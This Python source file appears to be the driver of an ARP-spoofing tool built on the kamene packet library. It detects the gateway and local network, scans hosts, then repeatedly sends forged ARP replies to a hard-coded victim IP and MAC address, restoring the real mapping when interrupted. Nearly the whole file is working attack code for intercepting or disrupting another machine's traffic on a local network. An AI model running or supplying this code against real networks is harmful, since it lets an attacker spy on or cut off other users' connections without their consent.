from  arp_poison import *
from scan_network import *
from kamene.config import conf
conf.ipv6_enabled = False
from kamene.all import *

def getDefaultNetworkInterface(NetworkRoot = False):
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("illegal netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = kamene.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None
        return net

    iface_routes = [route for route in kamene.config.conf.route.routes if route[3] == kamene.config.conf.iface and route[1] != 0xFFFFFFFF]
    network, netmask, _, interface, address = max(iface_routes, key=lambda item:item[1])
    net = to_CIDR_notation(network, netmask)
    if net:
        if NetworkRoot:
            return net
        else:
            return interface

def getGatewayIP():
    try:
        getGateway = sr1(IP(dst="github.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        return getGateway.src
    except:
        # request gateway IP address (after failed detection by kamene)
        print("\nERROR: Gateway IP could not be obtained. Please enter IP manually.{}\n")
        header = 'Enter Gateway IP (e.g. 192.168.1.1): '
        return (input(header))


def AttackInitialize():

    gateway_ip = getGatewayIP()
    Networkroot = getDefaultNetworkInterface(True)
    hosts = scan(Networkroot)
    print("\nSpoof attack started...")
    try:
        while True:
            # broadcast malicious ARP packets
            spoof_attack('cc:b0:da:46:1e:a9','192.168.137.1','192.168.137.241','F0:0F:EC:79:08:9D')
            time.sleep(10)

    except KeyboardInterrupt:
        # re-arp target on KeyboardInterrupt exception
        print("\nSpoof attack stopping...")
        reArp = 1
        while reArp != 10:
            try:
                # broadcast ARP packets with legitimate info to restore connection
                spoof_attack('54:8C:A0:91:E1:BB','192.168.137.1','192.168.137.241','F0:0F:EC:79:08:9D')
            except KeyboardInterrupt:
                pass
            
            reArp += 1
            time.sleep(0.2)
        print("Successfully stopped the ARP Spoofing attack")
